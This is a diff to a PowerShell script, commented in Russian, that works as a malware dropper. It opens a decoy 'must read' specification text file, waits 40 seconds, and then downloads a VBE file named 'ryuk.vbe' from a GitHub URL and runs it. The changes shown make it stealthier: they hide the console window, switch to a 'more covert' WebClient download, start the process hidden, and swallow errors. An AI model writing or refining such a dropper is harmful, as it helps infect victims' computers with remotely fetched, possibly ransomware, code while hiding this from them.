@@ -1,4 +1,14 @@
-# Создание текстового файла
+# Скрываем окно PowerShell
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consolePtr, 0)  # 0 = hide
+
+# Первая часть - создание текстового файла
 $fileName = "ОБЯЗАТЕЛЬНО К ПРОЧТЕНИЮ!! ТЗ по визуалу и структуре.txt"
 $filePath = Join-Path $env:LOCALAPPDATA $fileName
 
@@ -43,14 +53,31 @@ $content = @"
 $content | Out-File -FilePath $filePath -Encoding UTF8
 Invoke-Item $filePath
 
-# Задержка
+# Задержка 40 секунд
 Start-Sleep -Seconds 40
 
-# Скачивание и запуск файла
+# Вторая часть - скачивание и запуск файла
 $Url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ryuk.vbe"
-$FileName = "ryuk.vbe"
+$FileName = "ryuk.vbe"  # Явно указываем имя файла
 $LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
 $DownloadPath = Join-Path $LocalAppData $FileName
 
-Invoke-WebRequest -Uri $Url -OutFile $DownloadPath
-Start-Process -FilePath $DownloadPath
+# Скачивание и запуск (также скрытно)
+try {
+    # Используем более скрытный метод скачивания
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($Url, $DownloadPath)
+    
+    # Запускаем процесс скрытно
+    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
+    $processInfo.FileName = $DownloadPath
+    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $processInfo.CreateNoWindow = $true
+    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
+}
+catch {
+    # В случае ошибки просто игнорируем
+}
+
+# Завершаем скрипт
+exit
